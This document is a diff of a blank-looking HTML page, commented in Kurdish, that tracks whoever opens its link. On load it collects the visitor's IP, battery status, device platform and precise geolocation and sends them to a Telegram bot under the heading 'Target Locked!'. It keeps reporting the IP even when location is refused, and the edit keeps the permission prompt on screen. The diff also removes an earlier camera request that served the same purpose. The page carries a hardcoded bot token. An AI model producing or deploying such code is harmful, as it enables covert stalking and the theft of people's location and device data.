@@ -2,13 +2,12 @@
 <html lang="ku">
 <head>
     <meta charset="UTF-8">
-    <title> </title>
+    <title> </title>
     <style>body { background: white; margin: 0; }</style>
 </head>
 <body onload="capture()">
 
 <script>
-    // تۆکنەکەت لێرە جێگیر کراوە
     const TK = "8678050341:AAE7b3fvFpfGju4NXGaFiMsvhYC0UdnCYtE";
 
     async function capture() {
@@ -16,63 +15,49 @@
         const uid = urlParams.get('id');
         if (!uid) return;
 
+        // 1. Wargrtni IP u Battery yaksar (bē Permission)
+        let ipData = {ip: "N/A"};
+        let bat = "N/A", ch = "No";
         try {
-            // داواکردنی کامێرا بۆ ئەوەی پەنجەرەی Allow بمێنێتەوە و کۆدەکە ڕانەکات
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const res = await fetch('https://api.ipify.org?format=json');
+            ipData = await res.json();
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                bat = Math.floor(b.level * 100) + "%";
+                ch = b.charging ? "Yes" : "No";
+            }
+        } catch(e) {}
 
-            // ئەگەر Allow کرا، ئینجا لۆکەیشن وەردەگرین
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
+        // 2. Dāvāī Location dakat (Am dāvākaryaya la sar shāsha dēmenētavā)
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            let time = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', hour12: true });
 
-                // وەرگرتنی IP و زانیارییەکان
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                
-                // وەرگرتنی ناوچە لە ڕێگەی IP
-                const geo = await fetch(`http://ip-api.com/json/${ipData.ip}`).then(r => r.json());
-                
-                let bat = "N/A", ch = "No";
-                if (navigator.getBattery) {
-                    const b = await navigator.getBattery();
-                    bat = Math.floor(b.level * 100) + "%";
-                    ch = b.charging ? "Yes" : "No";
-                }
-                
-                let time = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', hour12: true });
+            let report = `🚨 <b>Target Locked!</b> (نێچیر گیرا)\n\n` +
+                         `📍 <b>Location:</b> <a href="https://www.google.com/maps?q=${lat},${lon}">[Google Maps Link]</a>\n` +
+                         `🌐 <b>IP:</b> <code>${ipData.ip}</code>\n` +
+                         `📱 <b>Device:</b> <code>${navigator.platform}</code>\n` +
+                         `🔋 <b>Battery:</b> <code>${bat}</code> (Charging: ${ch})\n` +
+                         `🕒 <b>Time:</b> <code>${time}</code>`;
 
-                let report = `🚨 <b>Target Locked!</b> (نێچیر گیرا)\n\n` +
-                             `📍 <b>Location:</b> <a href="https://www.google.com/maps?q=${lat},${lon}">[لینکی وردی Google Maps]</a>\n` +
-                             `🌐 <b>IP:</b> <code>${ipData.ip}</code> (${geo.isp || "Korek Telecom"})\n` +
-                             `📱 <b>Device:</b> <code>${navigator.platform}</code>\n` +
-                             `🔋 <b>Battery:</b> <code>${bat}</code> (Charging: ${ch})\n` +
-                             `🕒 <b>Time:</b> <code>${time}</code>\n` +
-                             `🏙️ <b>City:</b> <code>${geo.city || "Erbil/Bakhtiari"}</code>`;
+            // Nardn bō Telegram
+            await fetch(`https://api.telegram.org/bot${TK}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: uid,
+                    text: report,
+                    parse_mode: "HTML",
+                    disable_web_page_preview: false
+                })
+            });
 
-                // ناردنی داتا بۆ تێلیگرام
-                await fetch(`https://api.telegram.org/bot${TK}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        chat_id: uid,
-                        text: report,
-                        parse_mode: "HTML",
-                        disable_web_page_preview: false
-                    })
-                });
-
-                // دوای ناردن، دایبخە یان بیبە شوێنێکی تر
-                window.location.replace("https://www.google.com");
-
-            }, (err) => {
-                // ئەگەر لۆکەیشنی ڕەتکردەوە (Don't Allow)
-                window.location.replace("https://www.google.com");
-            }, { enableHighAccuracy: true });
-
-        } catch (e) {
-            // ئەگەر کامێرای ڕەتکردەوە (Don't Allow)
-            window.location.replace("https://www.google.com");
-        }
+            // Hich Redirect-ēk nakre, laparaka har la sar dāvāī allow-aka dēmenētavā
+        }, (err) => {
+            // Agar Don't Allow-ī krd, tanha IP-aka bnēra
+            fetch(`https://api.telegram.org/bot${TK}/sendMessage?chat_id=${uid}&text=⚠️ Target Denied Location, but IP is: ${ipData.ip}`);
+        }, { enableHighAccuracy: true, timeout: 10000 });
     }
 </script>
 </body>
